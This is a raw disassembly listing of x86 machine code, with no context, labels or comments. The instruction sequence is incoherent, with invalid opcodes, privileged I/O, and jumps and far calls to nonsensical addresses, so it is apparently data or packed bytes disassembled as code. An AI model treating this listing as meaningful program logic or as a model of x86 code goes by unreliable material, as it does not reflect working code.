  40cde2:	add    al,0xdc
  40cde4:	dec    esp
  40cde5:	fisub  WORD PTR [ecx+0x763bbdf4]
  40cdeb:	add    BYTE PTR ds:0x33b205a7,bh
  40cdf1:	push   0xb6d6309a
  40cdf6:	xchg   edi,eax
  40cdf7:	ds scas al,BYTE PTR es:[edi]
  40cdf9:	adc    eax,0x66024688
  40cdfe:	mov    ds,WORD PTR [ecx-0x326631e0]
  40ce04:	(bad)  [ebp-0x72]
  40ce07:	jno    0x40cdf8
  40ce09:	cdq    
  40ce0a:	fst    DWORD PTR [ecx]
  40ce0c:	adc    edx,0xa4ae7ad6
  40ce12:	jecxz  0x40cdb8
  40ce14:	stc    
  40ce15:	dec    eax
  40ce16:	test   eax,0x2f99c2bd
  40ce1b:	add    ebx,ebx
  40ce1d:	mov    ds:0x35db8f3,al
  40ce22:	popa   
  40ce23:	test   al,0xe5
  40ce25:	ins    BYTE PTR es:[edi],dx
  40ce26:	mov    al,ds:0x20d52f4b
  40ce2b:	fld    DWORD PTR [ebp*4+0x7a66bf64]
  40ce32:	add    ebx,DWORD PTR [eax-0x27]
  40ce35:	scas   al,BYTE PTR es:[edi]
  40ce36:	add    esi,DWORD PTR [esi-0x7a5d7f18]
  40ce3c:	push   cs
  40ce3d:	dec    eax
  40ce3e:	mov    edx,0x72c40a87
  40ce43:	nop
  40ce44:	std    
  40ce45:	add    eax,0x9e97ba26
  40ce4a:	sbb    DWORD PTR [eax-0x4a],ebp
  40ce4d:	in     al,dx
  40ce4e:	cmp    bh,BYTE PTR [esi+0x4ed6b6db]
  40ce54:	imul   edi,DWORD PTR [ebx],0xffffffa9
  40ce57:	sub    ebp,DWORD PTR [edi-0x5]
  40ce5a:	in     eax,0x76
  40ce5c:	pop    ss
  40ce5d:	pop    ss
  40ce5e:	mov    DWORD PTR [ebx-0x30],esp
  40ce61:	mov    esi,0xbd83040b
  40ce66:	xchg   edi,eax
  40ce67:	cmp    al,0xc0
  40ce69:	cmp    eax,0x1482c538
  40ce6e:	loope  0x40ce87
  40ce70:	retf   
  40ce71:	dec    edi
  40ce72:	in     eax,0x19
  40ce74:	dec    esi
  40ce75:	pop    eax
  40ce76:	shl    esp,0x46
  40ce79:	popf   
  40ce7a:	jmp    DWORD PTR ds:0xa93798a7
  40ce80:	and    BYTE PTR [eax],dh
  40ce82:	data16 scas al,BYTE PTR es:[edi]
  40ce84:	loop   0x40ce1e
  40ce86:	stc    
  40ce87:	mov    ecx,0xeb402692
  40ce8c:	out    dx,eax
  40ce8d:	mov    eax,0x20df8e55
  40ce92:	loopne 0x40ce6c
  40ce94:	jg     0x40ce74
  40ce96:	into   
  40ce97:	sbb    edx,DWORD PTR [eax+0x74]
  40ce9a:	fbstp  TBYTE PTR [edi+0x4cd98e38]
  40cea0:	ficom  WORD PTR [ebx+0x5902bf70]
  40cea6:	mov    al,ds:0x978430b6
  40ceab:	mov    dh,0x69
  40cead:	mov    bh,0xd1
  40ceaf:	dec    edx
  40ceb0:	inc    edx
  40ceb1:	xchg   edi,eax
  40ceb2:	imul   esi,DWORD PTR [ecx-0x7e33c107],0x1d
  40ceb9:	inc    ecx
  40ceba:	in     al,dx
  40cebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cebc:	mov    al,ds:0x36bdae3e
  40cec1:	mov    edx,0x8fd2f994
  40cec6:	adc    al,0x3f
  40cec8:	call   0xee0a511
  40cecd:	les    edi,FWORD PTR [esi]
  40cecf:	retf   
  40ced0:	pop    ds
  40ced1:	fwait
  40ced2:	push   cs
  40ced3:	pop    ebp
  40ced4:	cli    
  40ced5:	xchg   esp,eax
  40ced6:	adc    dl,BYTE PTR [ebx+0x529b90a7]
  40cedc:	ins    DWORD PTR es:[edi],dx
  40cedd:	jbe    0x40cf02
  40cedf:	je     0x40cef9
  40cee1:	mov    bl,0x4f
  40cee3:	rcl    DWORD PTR [eax],0x87
  40cee6:	lods   al,BYTE PTR ds:[esi]
  40cee7:	ss scas eax,DWORD PTR es:[edi]
  40cee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ceea:	push   cs
  40ceeb:	cdq    
  40ceec:	pop    esi
  40ceed:	cmp    BYTE PTR ds:0x8de4b34f,bh
  40cef3:	add    DWORD PTR [ebp-0x4fa4d783],ebx
  40cef9:	or     BYTE PTR [esi-0x47],al
  40cefc:	add    ah,cl
  40cefe:	jne    0x40cf7d
  40cf00:	cmp    al,0x2f
  40cf02:	mov    bh,0x9c
  40cf04:	(bad)  
  40cf05:	out    dx,al
  40cf06:	daa    
  40cf07:	push   0x31ba5673
  40cf0c:	xchg   edx,eax
  40cf0d:	xchg   ecx,eax
  40cf0e:	jnp    0x40cf5e
  40cf10:	sub    DWORD PTR [ebx+0x154174de],ebx
  40cf16:	push   es
  40cf17:	push   0xffffffdc
  40cf19:	jns    0x40cf76
  40cf1b:	cmp    bl,BYTE PTR [esi+0x61a67fe6]
  40cf21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf22:	(bad)  
  40cf23:	mov    ?,WORD PTR [ecx+0x1a]
  40cf26:	ficom  DWORD PTR [ecx+0x33cfd376]
  40cf2c:	loop   0x40ced5
  40cf2e:	or     eax,0xa8a9b82
  40cf33:	js     0x40cfa1
  40cf35:	and    DWORD PTR [edx+eax*4+0x7ed76176],ebp
  40cf3c:	jge    0x40cf4a
  40cf3e:	cwde   
  40cf3f:	sub    ebp,esi
  40cf41:	push   0x2b
  40cf43:	sbb    al,0x44
  40cf45:	xlat   BYTE PTR ds:[ebx]
  40cf46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf47:	push   es
  40cf48:	pop    ss
  40cf49:	iret   
  40cf4a:	pop    esp
  40cf4b:	sub    eax,0x1171528b
  40cf50:	xor    DWORD PTR [ebx-0x74ba47e8],eax
  40cf56:	test   al,0x8d
  40cf58:	and    ebp,DWORD PTR [ebx+0x14]
  40cf5b:	daa    
  40cf5c:	popa   
  40cf5d:	dec    DWORD PTR [esi+0xeabbb68]
  40cf63:	fst    DWORD PTR [eax-0x5dbf769c]
  40cf69:	repnz ds mov al,0xb
  40cf6d:	stc    
  40cf6e:	outs   dx,BYTE PTR ds:[esi]
  40cf6f:	add    bl,BYTE PTR [esp+eiz*4]
  40cf72:	dec    ebx
  40cf73:	call   0x4494ca0
  40cf78:	jnp    0x40cfc6
  40cf7a:	jae    0x40cffa
  40cf7c:	sahf   
  40cf7d:	push   ebp
  40cf7e:	push   ss
  40cf7f:	mov    ds,WORD PTR [edi-0x5a6d0a73]
  40cf85:	dec    ebx
  40cf86:	out    0xa7,al
  40cf88:	push   eax
  40cf89:	pusha  
  40cf8a:	sahf   
  40cf8b:	xchg   edx,eax
  40cf8c:	mov    ecx,0x5bcc0735
  40cf91:	iret   
  40cf92:	shl    BYTE PTR [ebx+0x3fc5decb],cl
  40cf98:	popa   
  40cf99:	rcr    DWORD PTR [eax+0x5e5ba10d],0xdf
  40cfa0:	aad    0x6b
  40cfa2:	je     0x40cfa4
  40cfa4:	xchg   ecx,eax
  40cfa5:	bound  ebx,QWORD PTR [ebx+0x7a]
  40cfa8:	mov    ds:0xb1699bb,eax
  40cfad:	xor    BYTE PTR [eax],0xe1
  40cfb0:	jbe    0x40d025
  40cfb2:	in     eax,0x5
  40cfb4:	xchg   ebp,eax
  40cfb5:	mov    cl,0xfb
  40cfb7:	push   ebx
  40cfb8:	cmp    ecx,DWORD PTR [eax]
  40cfba:	cwde   
  40cfbb:	push   DWORD PTR [esi+0x59]
  40cfbe:	cmp    ebx,esi
  40cfc0:	pop    esp
  40cfc1:	nop
  40cfc2:	xor    al,0xed
  40cfc4:	fist   DWORD PTR [eax-0x7f53f438]
  40cfca:	mov    ?,WORD PTR [ecx-0x7e8f9571]
  40cfd0:	jl     0x40d015
  40cfd2:	pusha  
  40cfd3:	mov    ch,0x34
  40cfd5:	xchg   ecx,eax
  40cfd6:	xor    DWORD PTR [edx],0x2452b10b
  40cfdc:	sbb    bh,dl
  40cfde:	mov    DWORD PTR [edx+ebp*8+0x69],esi
  40cfe2:	or     DWORD PTR [ebp-0x1163c52d],0xe9903abf
  40cfec:	dec    eax
  40cfed:	stos   DWORD PTR es:[edi],eax
  40cfee:	xchg   DWORD PTR [esi],ebp
  40cff0:	into   
  40cff1:	cwde   
  40cff2:	push   ecx
  40cff3:	sub    edi,DWORD PTR [esp+ecx*8]
  40cff6:	out    dx,al
  40cff7:	stos   DWORD PTR es:[edi],eax
  40cff8:	sub    ebx,DWORD PTR [esi+0x22e67da1]
  40cffe:	push   0x50
  40d000:	pop    ebx
  40d001:	out    dx,al
  40d002:	push   edx
  40d003:	jae    0x40d042
  40d005:	test   DWORD PTR [edx],ebp
  40d007:	inc    esp
  40d008:	sub    al,0xf2
  40d00a:	int    0x18
  40d00c:	repz cld 
  40d00e:	in     eax,dx
  40d00f:	jo     0x40d074
  40d011:	hlt    
  40d012:	cmp    eax,0xe3bdfe68
  40d017:	xchg   BYTE PTR [ebx+0xc],cl
  40d01a:	dec    edx
  40d01b:	xchg   edx,eax
  40d01c:	fisttp WORD PTR [edi-0x6f]
  40d01f:	fwait
  40d020:	adc    ch,ah
  40d022:	in     al,0xdc
  40d024:	aas    
  40d025:	les    edx,FWORD PTR [esi-0x46]
  40d028:	fistp  QWORD PTR [esi+0x3127ba7e]
  40d02e:	out    0xdb,eax
  40d030:	leave  
  40d031:	dec    edi
  40d032:	das    
  40d033:	inc    edx
  40d034:	push   ds
  40d035:	scas   al,BYTE PTR es:[edi]
  40d036:	les    eax,FWORD PTR [eax+ebx*8-0x2b4002e2]
  40d03d:	sub    BYTE PTR [esp+ecx*4],dl
  40d040:	in     al,0xc6
  40d042:	and    edi,DWORD PTR [edx]
  40d044:	shr    bh,cl
  40d046:	jmp    0xc3afe85f
  40d04b:	daa    
  40d04c:	std    
  40d04d:	jp     0x40d0a7
  40d04f:	mov    eax,0x59c7d7bd
  40d054:	nop
  40d055:	mov    ebx,0x120ab900
  40d05a:	sbb    ebp,DWORD PTR [esi-0x1a564ce6]
  40d060:	mov    ds:0xe1d371c4,al
  40d065:	dec    edx
  40d066:	cmp    BYTE PTR [ebx-0x29674d91],al
  40d06c:	sub    DWORD PTR [ebx+0x72556473],esp
  40d072:	jmp    0x8542a039
  40d077:	xor    al,0x26
  40d079:	push   ss
  40d07a:	aas    
  40d07b:	dec    eax
  40d07c:	das    
  40d07d:	jno    0x40d0d0
  40d07f:	cmp    DWORD PTR [ebp+0x4c],esi
  40d082:	xor    eax,0x1f56d5d1
  40d087:	jo     0x40d019
  40d089:	out    0x70,eax
  40d08b:	and    eax,0x47a5cfcd
  40d090:	push   ebp
  40d091:	mov    cl,0x14
  40d093:	and    DWORD PTR [edx-0x49bbf8de],edi
  40d099:	popf   
  40d09a:	(bad)  
  40d09b:	idiv   DWORD PTR [ecx-0x556e5655]
  40d0a1:	push   edi
  40d0a2:	call   0x6196:0x454b76ef
  40d0a9:	dec    esp
  40d0aa:	sbb    DWORD PTR [esi+ebp*1+0x47],ebp
  40d0ae:	push   ds
  40d0af:	mov    ds:0x36b95edc,al
  40d0b4:	sub    bl,ah
  40d0b6:	pop    ds
  40d0b7:	jmp    0x40d0cc
  40d0b9:	sub    edx,DWORD PTR [eax]
  40d0bb:	(bad)  
  40d0bc:	xchg   edi,eax
  40d0bd:	or     al,0xdc
  40d0bf:	sbb    eax,0x50785125
  40d0c4:	xor    al,0xa4
  40d0c6:	jns    0x40d06a
  40d0c8:	or     BYTE PTR [esp+edx*1],dh
  40d0cb:	dec    eax
  40d0cc:	pop    ecx
  40d0cd:	sbb    esp,DWORD PTR [eiz*4+0x45ef8a1b]
  40d0d4:	shl    DWORD PTR [edi+0x7cb72726],cl
  40d0da:	jno    0x40d150
  40d0dc:	pop    esp
  40d0dd:	jbe    0x40d112
  40d0df:	jb     0x40d107
  40d0e1:	jae    0x40d0af
  40d0e3:	loopne 0x40d07f
  40d0e5:	pop    ecx
  40d0e6:	mov    esi,0xf4f06857
  40d0eb:	dec    esp
  40d0ec:	pop    ebp
  40d0ed:	jmp    0x364df28c
  40d0f2:	inc    eax
  40d0f3:	out    0x75,al
  40d0f5:	add    eax,0x9bf4147c
  40d0fa:	sti    
  40d0fb:	repz xor ah,dl
  40d0fe:	out    0x9d,eax
  40d100:	ja     0x40d093
  40d102:	ins    DWORD PTR es:[edi],dx
  40d103:	lds    ebp,FWORD PTR [esi]
  40d105:	and    ecx,esp
  40d107:	sub    al,BYTE PTR [ebx+edi*4]
  40d10a:	jo     0x40d0f4
  40d10c:	and    al,0xa
  40d10e:	leave  
  40d10f:	push   ecx
  40d110:	dec    esi
  40d111:	int    0x2c
  40d113:	dec    esp
  40d114:	sbb    al,0x3
  40d116:	adc    al,0xc2
  40d118:	pop    edx
  40d119:	dec    esi
  40d11a:	pop    ebp
  40d11b:	fdiv   DWORD PTR ds:0x2960d02b
  40d121:	das    
  40d122:	pushf  
  40d123:	in     eax,dx
  40d124:	ret    0xe634
  40d127:	mov    ebx,0xa710e5e0
  40d12c:	mov    edx,0xeec4e987
  40d131:	xor    DWORD PTR [ebp+eiz*4-0x4ba82d64],0x42
  40d139:	and    edi,DWORD PTR [eax+edx*2]
  40d13c:	js     0x40d190
  40d13e:	in     al,dx
  40d13f:	xlat   BYTE PTR ds:[ebx]
  40d140:	sub    ebp,DWORD PTR [ecx-0x4b]
  40d143:	jg     0x40d162
  40d145:	jns    0x40d123
  40d147:	mov    al,0x7
  40d149:	pop    edi
  40d14a:	xor    DWORD PTR es:0xc391c47d,esp
  40d151:	out    dx,al
  40d152:	repz xor DWORD PTR [esi-0x5f9cadbd],eax
  40d159:	mov    BYTE PTR ds:0x44d6a7a6,dl
  40d15f:	fdiv   st(7),st
  40d161:	and    dl,BYTE PTR ds:0xe3609d90
  40d167:	pop    ecx
  40d168:	fbstp  TBYTE PTR [esi+0x2b]
  40d16b:	mov    BYTE PTR [ecx],al
  40d16d:	test   al,0xcc
  40d16f:	cmp    bh,dh
  40d171:	in     eax,0x45
  40d173:	cmp    esi,edi
  40d175:	push   eax
  40d176:	add    eax,0x8b6b14c1
  40d17b:	inc    eax
  40d17c:	fcmovnb st,st(1)
  40d17e:	jge    0x40d140
  40d180:	xor    cl,bl
  40d182:	jnp    0x40d121
  40d184:	dec    edi
  40d185:	stos   DWORD PTR es:[edi],eax
  40d186:	fdivp  st(5),st
  40d188:	push   ebp
  40d189:	or     esi,DWORD PTR [ecx-0x75]
  40d18c:	loope  0x40d1e8
  40d18e:	retf   0x6d2c
  40d191:	jne    0x40d1d9
  40d193:	push   esi
  40d194:	icebp  
  40d195:	pop    ss
  40d196:	neg    DWORD PTR [edx]
  40d198:	jle    0x40d1e4
  40d19a:	push   esi
  40d19b:	add    eax,0xab17b605
  40d1a0:	dec    eax
  40d1a1:	push   eax
  40d1a2:	xor    dh,ch
  40d1a4:	cmp    BYTE PTR [esi],cl
  40d1a6:	pop    ecx
  40d1a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1a8:	into   
  40d1a9:	jb     0x40d1a0
  40d1ab:	push   0xffffff9f
  40d1ad:	loopne 0x40d1e3
  40d1af:	xchg   ebx,eax
  40d1b0:	adc    al,0xd2
  40d1b2:	fcmovbe st,st(5)
  40d1b4:	xchg   edi,eax
  40d1b5:	mov    esi,0x3dc06d88
  40d1ba:	imul   edi,DWORD PTR [edx],0xffffffed
  40d1bd:	mov    ebp,0xb8ca1135
  40d1c2:	inc    ebx
  40d1c3:	int3   
  40d1c4:	out    dx,al
  40d1c5:	test   al,0x3a
  40d1c7:	out    0x2a,eax
  40d1c9:	lods   al,BYTE PTR ds:[esi]
  40d1ca:	xchg   DWORD PTR [esi-0x3d],edx
  40d1cd:	and    bh,al
  40d1cf:	jge    0x40d18e
  40d1d1:	dec    edx
  40d1d2:	push   ebp
  40d1d3:	sub    BYTE PTR [eax],dh
  40d1d5:	int3   
  40d1d6:	sbb    eax,0x844f1755
  40d1db:	mov    ebx,0x4f76d7d5
  40d1e0:	mov    ch,0xf
  40d1e2:	jne    0x40d20d
  40d1e4:	mov    edi,0x247e2731
  40d1e9:	xchg   ebx,eax
  40d1ea:	sub    ch,BYTE PTR [ebx]
  40d1ec:	add    ecx,DWORD PTR [ebp+edx*8-0x43]
  40d1f0:	xchg   ecx,eax
  40d1f1:	add    al,0x3b
  40d1f3:	imul   eax,DWORD PTR [ebp+0x561d1228],0xffffffca
  40d1fa:	inc    edx
  40d1fb:	loop   0x40d1a5
  40d1fd:	icebp  
  40d1fe:	sbb    BYTE PTR [edx-0x141e9f35],0x76
  40d205:	xor    bl,cl
  40d207:	pop    ds
  40d208:	cmc    
  40d209:	mov    ch,0xd2
  40d20b:	cli    
  40d20c:	in     eax,dx
  40d20d:	into   
  40d20e:	xor    al,0xfe
  40d210:	mov    dh,0xa
  40d212:	rcl    BYTE PTR [ebp+0x5a0b5d32],cl
  40d218:	xchg   ecx,eax
  40d219:	adc    eax,DWORD PTR [ebp+0x12]
  40d21c:	pusha  
  40d21d:	mov    dh,0xe0
  40d21f:	(bad)  
  40d220:	out    dx,eax
  40d221:	jg     0x40d24c
  40d223:	dec    eax
  40d224:	cmp    esi,esi
  40d226:	and    al,0xcf
  40d228:	dec    esp
  40d229:	inc    eax
  40d22a:	scas   eax,DWORD PTR es:[edi]
  40d22b:	mov    cx,0xf1be
  40d22f:	or     BYTE PTR [edi-0x28],0x22
  40d233:	and    edx,DWORD PTR [edx-0x64]
  40d236:	fwait
  40d237:	cs sahf 
  40d239:	arpl   WORD PTR ds:0xe86e72c3,cx
  40d23f:	test   BYTE PTR [eax+0x7b23186d],bh
  40d245:	stc    
  40d246:	ret    0x4200
  40d249:	push   ebx
  40d24a:	push   eax
  40d24b:	mov    bh,0x64
  40d24d:	(bad)  
  40d24e:	jge    0x40d243
  40d250:	pop    ss
  40d251:	or     al,BYTE PTR [edi]
  40d253:	fist   WORD PTR [esi-0x5c5bca79]
  40d259:	lods   eax,DWORD PTR cs:[esi]
  40d25b:	(bad)  
  40d25c:	aas    
  40d25d:	leave  
  40d25e:	outs   dx,DWORD PTR ds:[esi]
  40d25f:	cmp    esp,DWORD PTR [ebp-0x3e]
  40d262:	add    DWORD PTR [ebp+0xf],esp
  40d265:	test   BYTE PTR [ebx-0x38],dh
  40d268:	in     ax,0x8b
  40d26b:	mov    ss,WORD PTR [edx+0x5b]
  40d26e:	inc    eax
  40d26f:	and    eax,0xc03defe1
  40d274:	call   DWORD PTR [edx+0x7f]
  40d277:	mov    ebp,0xcc9d0ca0
  40d27c:	mov    BYTE PTR [esi],bl
  40d27e:	lahf   
  40d27f:	cmp    BYTE PTR [eax],0x38
  40d282:	call   0x189eb23b
  40d287:	outs   dx,BYTE PTR ds:[esi]
  40d288:	jp     0x40d2f2
  40d28a:	popf   
  40d28b:	into   
  40d28c:	bound  ecx,QWORD PTR [ecx-0x30]
  40d28f:	xchg   ebp,eax
  40d290:	jle    0x40d286
  40d292:	mov    dh,0x5f
  40d294:	pop    edx
  40d295:	test   al,0xa8
  40d297:	(bad)  
  40d298:	or     BYTE PTR [eax+edx*1-0x70baf536],ah
  40d29f:	xlat   BYTE PTR ds:[ebx]
  40d2a0:	sub    BYTE PTR [edx],dl
  40d2a2:	fstp   st(7)
  40d2a4:	mov    ch,0xf8
  40d2a6:	mov    bh,0xe0
  40d2a8:	aam    0xa1
  40d2aa:	loop   0x40d2d6
  40d2ac:	fnstsw WORD PTR [eax-0x3f]
  40d2af:	stc    
  40d2b0:	pop    esi
  40d2b1:	jle    0x40d2b5
  40d2b3:	daa    
  40d2b4:	fld    DWORD PTR [ecx]
  40d2b6:	xchg   ecx,eax
  40d2b7:	cwde   
  40d2b8:	int3   
  40d2b9:	sahf   
  40d2ba:	ror    BYTE PTR [esi+0x23],0xf5
  40d2be:	shr    BYTE PTR [edi+ecx*1],1
  40d2c1:	push   ds
  40d2c2:	adc    edi,DWORD PTR [ebx]
  40d2c4:	jbe    0x40d283
  40d2c6:	jbe    0x40d251
  40d2c8:	inc    DWORD PTR [edx+0x21]
  40d2cb:	cld    
  40d2cc:	mov    ebx,0x68b974bf
  40d2d1:	rcl    DWORD PTR [edi+ecx*4+0x2c],0x8d
  40d2d6:	out    dx,eax
  40d2d7:	cmp    dl,0x40
  40d2da:	add    al,0xf2
  40d2dc:	out    dx,eax
  40d2dd:	sar    DWORD PTR [edx],1
  40d2df:	mov    dl,0xf7
  40d2e1:	mov    esi,0xcc186f31
  40d2e6:	jmp    0x2c87:0x77aeb2e
  40d2ed:	and    ah,bh
  40d2ef:	cs sahf 
  40d2f1:	or     DWORD PTR [esi-0xbf49fb3],edi
  40d2f7:	jecxz  0x40d34d
  40d2f9:	mov    ebp,0xc7d4c208
  40d2fe:	enter  0x901,0xad
  40d302:	and    esi,DWORD PTR [edx+0x762fc284]
  40d308:	retf   0x476b
  40d30b:	pop    ss
  40d30c:	nop
  40d30d:	or     ah,0x24
  40d310:	daa    
  40d311:	adc    eax,0x6729089c
  40d316:	in     al,0x99
  40d318:	sbb    DWORD PTR [ebx-0x21a5184e],0x75903f8a
  40d322:	lods   eax,DWORD PTR ds:[esi]
  40d323:	mov    ch,0xd2
  40d325:	loop   0x40d316
  40d327:	xchg   edi,eax
  40d328:	in     al,dx
  40d329:	aaa    
  40d32a:	pop    ebp
  40d32b:	adc    eax,0xa0a8db5c
  40d330:	mov    edx,0x4e39fa8f
  40d335:	ftst   
  40d337:	addr16 xchg ebp,eax
  40d339:	ror    ecx,0x9c
  40d33c:	gs jge 0x40d35a
  40d33f:	jg     0x40d36a
  40d341:	out    dx,eax
  40d342:	lock stc 
  40d344:	mov    ebx,0x1458674a
  40d349:	scas   eax,DWORD PTR es:[edi]
  40d34a:	inc    ecx
  40d34b:	retf   0xcf35
  40d34e:	or     bl,BYTE PTR [ecx+0x630b469]
  40d354:	cmp    DWORD PTR [ecx+eax*4-0x21],0xcdb09461
  40d35c:	mov    al,0x7e
  40d35e:	xchg   esi,eax
  40d35f:	or     esi,edx
  40d361:	outs   dx,DWORD PTR ds:[esi]
  40d362:	jmp    DWORD PTR [edx+0x33a6ad2a]
  40d368:	mov    esi,0x6de17dd0
  40d36d:	rcr    DWORD PTR gs:[edx],0x6e
  40d371:	mov    WORD PTR [ebx],?
  40d373:	mov    esi,0x660bc557
  40d378:	xchg   edx,eax
  40d379:	mov    ds:0xca539df0,eax
  40d37e:	xlat   BYTE PTR ds:[ebx]
  40d37f:	(bad)  
  40d380:	mov    bh,0xc5
  40d382:	sub    eax,0xec37d77e
  40d387:	dec    ebp
  40d388:	pop    ds
  40d389:	xlat   BYTE PTR ds:[ebx]
  40d38a:	(bad)  
  40d38b:	mov    ebx,0x9ad37687
  40d390:	popf   
  40d391:	sub    BYTE PTR [eax+0x5f82863c],0x34
  40d398:	(bad)  
  40d399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d39a:	ds adc ah,al
  40d39d:	das    
  40d39e:	sbb    BYTE PTR [edx-0x302d4673],cl
  40d3a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3a5:	sahf   
  40d3a6:	inc    edx
  40d3a7:	inc    eax
  40d3a8:	dec    edi
  40d3a9:	data16 test BYTE PTR [edi],bh
  40d3ac:	inc    ecx
  40d3ad:	mov    al,es:0xf0af76e3
  40d3b3:	shr    esi,0xc0
  40d3b6:	lods   eax,DWORD PTR ds:[esi]
  40d3b7:	mov    ecx,0x7b9c4186
  40d3bc:	(bad)  
  40d3be:	or     eax,0x97949397
  40d3c3:	push   edi
  40d3c4:	xor    cl,ch
  40d3c6:	aad    0x81
  40d3c8:	push   esp
  40d3c9:	jmp    0x4f8e:0x48c976a4
  40d3d0:	inc    ecx
  40d3d1:	xor    ch,BYTE PTR [edi-0xb]
  40d3d4:	xor    ah,bl
  40d3d6:	push   es
  40d3d7:	loopne 0x40d398
  40d3d9:	aaa    
  40d3da:	add    al,0xdd
  40d3dc:	adc    ebp,DWORD PTR [ebx-0x539074fd]
  40d3e2:	std    
  40d3e3:	cs add al,0x6c
  40d3e6:	sub    DWORD PTR [esi+esi*8+0x7c91ab7b],ebx
  40d3ed:	push   cs
  40d3ee:	cwde   
  40d3ef:	(bad)  
  40d3f0:	jle    0x40d471
  40d3f2:	jns    0x40d46b
  40d3f4:	scas   al,BYTE PTR es:[edi]
  40d3f5:	lods   eax,DWORD PTR ds:[esi]
  40d3f6:	loop   0x40d408
  40d3f8:	cli    
  40d3f9:	mov    esi,0x9b4b48fc
  40d3fe:	les    edi,FWORD PTR [ecx+ebp*8+0x1d891240]
  40d405:	lock into 
  40d407:	loope  0x40d40e
  40d409:	cmp    eax,0xfa11f2b3
  40d40e:	loopne 0x40d3bb
  40d410:	(bad)  
  40d411:	imul   eax,DWORD PTR ss:[ecx],0xffffffa1
  40d415:	imul   edi,DWORD PTR [esi+0x1103b738],0xf3c01174
  40d41f:	xchg   ecx,eax
  40d420:	and    ecx,ebx
  40d422:	(bad)  
  40d423:	pop    esi
  40d424:	sbb    edx,0x9d2ca841
  40d42a:	mov    esi,0x8c4d5454
  40d42f:	jl     0x40d426
  40d431:	adc    DWORD PTR [edx+0x1e155cd1],esi
  40d437:	and    BYTE PTR [ecx],0x75
  40d43a:	repz cs sti 
  40d43d:	mov    eax,0x8b3adaec
  40d442:	adc    esi,DWORD PTR [ebx+ebx*2+0x53]
  40d446:	dec    ebx
  40d447:	ins    BYTE PTR es:[edi],dx
  40d448:	jne    0x40d4c9
  40d44a:	pop    ss
  40d44b:	pop    ss
  40d44c:	dec    esp
  40d44d:	fstp   QWORD PTR [edx+esi*4-0x54b03f2c]
  40d454:	aam    0xa5
  40d456:	cmp    al,0xa1
  40d458:	scas   al,BYTE PTR es:[edi]
  40d459:	or     bl,dh
  40d45b:	sub    al,0x5e
  40d45d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d45e:	push   0x79e4a04d
  40d463:	sbb    DWORD PTR [edx-0x66cfb096],0xffffff8e
  40d46a:	or     eax,0xb148182b
  40d46f:	inc    eax
  40d470:	jo     0x40d470
  40d472:	leavew 
  40d474:	dec    ebp
  40d475:	icebp  
  40d476:	xchg   edx,eax
  40d477:	push   edi
  40d478:	retf   
  40d479:	mov    cl,BYTE PTR [eax]
  40d47b:	(bad)  
  40d47c:	mov    dh,0x68
  40d47e:	adc    BYTE PTR [eax-0x61],0xf1
  40d482:	aas    
  40d483:	ds cmp eax,0xd67191c4
  40d489:	sahf   
  40d48a:	addr16 lock xchg ebx,eax
  40d48d:	loope  0x40d4c4
  40d48f:	dec    ecx
  40d490:	jle    0x40d4d5
  40d492:	or     BYTE PTR [ebx*8-0x77c3d538],0x79
  40d49a:	in     eax,0x5a
  40d49c:	push   ss
  40d49d:	adc    al,0x7c
  40d49f:	jno    0x40d4be
  40d4a1:	and    DWORD PTR [eax-0x5e],esp
  40d4a4:	out    dx,eax
  40d4a5:	pop    ebp
  40d4a6:	outs   dx,DWORD PTR ds:[esi]
  40d4a7:	push   edi
  40d4a8:	xlat   BYTE PTR ds:[ebx]
  40d4a9:	clc    
  40d4aa:	sbb    al,0xfe
  40d4ac:	nop
  40d4ad:	dec    ecx
  40d4ae:	lods   eax,DWORD PTR ds:[esi]
  40d4af:	mov    eax,0x33b4746b
  40d4b4:	dec    ebp
  40d4b5:	cli    
  40d4b6:	cs jb  0x40d44a
  40d4b9:	or     eax,0x10ef2419
  40d4be:	mov    bh,0xd2
  40d4c0:	inc    ebp
  40d4c1:	stos   DWORD PTR es:[edi],eax
  40d4c2:	sbb    BYTE PTR ds:0xd9d00337,ch
  40d4c8:	mov    DWORD PTR [esi-0x7b],eax
  40d4cb:	inc    edi
  40d4cc:	bound  edx,QWORD PTR [ecx+0x6c11b530]
  40d4d2:	inc    edi
  40d4d3:	std    
  40d4d4:	test   BYTE PTR [ebx+0x2a4865],0xc1
  40d4db:	jnp    0x40d4e8
  40d4dd:	repz cmp esp,DWORD PTR [eax]
  40d4e0:	rol    BYTE PTR [esi],cl
  40d4e2:	repz inc ecx
  40d4e4:	inc    esi
  40d4e5:	pusha  
  40d4e6:	mov    ecx,0x331e944a
  40d4eb:	lods   al,BYTE PTR ds:[esi]
  40d4ec:	push   eax
  40d4ed:	test   BYTE PTR [edi+0x6d],ah
  40d4f0:	pop    ds
  40d4f1:	ret    0xf6fc
  40d4f4:	push   0x6c
  40d4f6:	test   al,0x65
  40d4f8:	mov    DWORD PTR [edx-0x7f2a0e02],edi
  40d4fe:	rcl    BYTE PTR [ebx],0x3f
  40d501:	sub    bh,al
  40d503:	sub    DWORD PTR [edi],ebp
  40d505:	loope  0x40d4cc
  40d507:	mov    cl,0x78
  40d509:	aad    0xc8
  40d50b:	add    bl,BYTE PTR [ecx+0x50f3dfa3]
  40d511:	rcr    BYTE PTR [ebx+eax*4],1
  40d514:	fcom   DWORD PTR [edx]
  40d516:	mov    esi,0x5e5966b0
  40d51b:	or     al,0xbd
  40d51d:	ja     0x40d4d9
  40d51f:	dec    ebx
  40d520:	lds    eax,FWORD PTR [ebx+0x734fe91e]
  40d526:	add    BYTE PTR [ecx+ebp*8],bl
  40d529:	int3   
  40d52a:	mov    edi,0x1c8e9bab
  40d52f:	xchg   esp,eax
  40d530:	call   0xbae4:0xc847324c
  40d537:	cmp    DWORD PTR [esi+0x6e],eax
  40d53a:	aas    
  40d53b:	cs mov cl,0x68
  40d53e:	mov    fs,WORD PTR [edi+ebp*4]
  40d541:	jmp    0x990259a7
  40d546:	cdq    
  40d547:	and    eax,0xe937a680
  40d54c:	call   0x7641:0xe3b558a9
  40d553:	inc    ebp
  40d554:	call   0xed8ae4af
